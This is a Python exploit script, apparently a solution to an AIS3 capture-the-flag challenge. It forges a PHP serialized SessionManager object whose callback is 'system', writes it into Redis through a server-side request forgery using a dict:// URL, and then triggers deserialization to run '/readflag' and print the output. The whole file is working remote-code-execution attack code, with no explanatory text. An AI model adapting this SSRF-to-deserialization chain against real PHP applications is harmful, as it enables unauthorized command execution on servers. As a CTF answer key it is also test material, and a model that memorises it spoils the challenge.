import requests

def payloadGenerator(command):
    command_len = len(command)
    session = 'O:14:"SessionManager":6:{s:5:"redis";O:5:"Redis":0:{}s:6:"sessid";s:4:"test";s:6:"encode";s:6:"system";s:6:"decode";s:11:"unserialize";s:8:"fallback";s:7:"phpinfo";s:3:"val";s:' + str(command_len) + ':"' + command + '";}'
    session = session.encode("utf-8").hex()
    final_session = ""

    for i in range(0, len(session)+1, 2):
        if session[i:i+2] == "":
            break

        tmp = r"\x" + session[i:i+2]
        final_session += tmp

    return final_session

def RCE(cookie, command):
    requests.get("http://chals1.ais3.org:8763/api.php?action=view&url=dict://redis:6379/set:{}:\"{}\"".format(cookie, payloadGenerator(command)))

    response = requests.get("http://chals1.ais3.org:8763/api.php?action=clear_history", cookies={
        "sess_id": cookie
    })

    for i in response.text.split('\n')[7:]:
        print(i)

RCE("whatever", "/readflag")
